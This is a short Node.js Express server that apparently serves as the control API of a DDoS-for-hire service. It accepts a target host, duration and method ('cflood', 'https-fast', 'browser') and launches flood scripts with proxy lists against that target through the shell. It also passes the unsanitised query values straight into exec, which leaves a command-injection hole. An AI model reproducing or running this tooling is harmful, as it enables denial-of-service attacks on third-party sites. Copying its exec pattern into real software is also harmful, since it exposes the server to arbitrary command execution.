const express = require('express');
const { exec } = require('child_process');

const app = express();
const PORT = 9922;

app.get('/api', (req, res) => {
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (!host || !port || !time || !method) {
        return res.status(400).json({ error: 'Henry API Network 3 method allow [cflood, https-fast, browser]' });
    }

    let command = '';

    if (method === 'cflood') {
        command = `screen node cflood.js GET ${host} ${time} 4 90 http.txt --flood`;
    } else if (method === 'https-fast') {
        command = `screen node https-fast.js GET ${host} ${time} 10 90 https.txt --full`;
    } else if (method === 'browser') {
        command = `screen node browser ${host} ${time} 50 50 5009 vn2.txt`;
    } else {
        return res.status(400).json({ error: 'Invalid method.' });
    }

    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).json({ error: 'Failed to attack...' });
        }

        res.json({
            success: true,
            host: host,
            port: port,
            time: time,
            method: method
        });
    });
});

app.listen(PORT, () => {
    console.log(`API start on port ${PORT}`);
});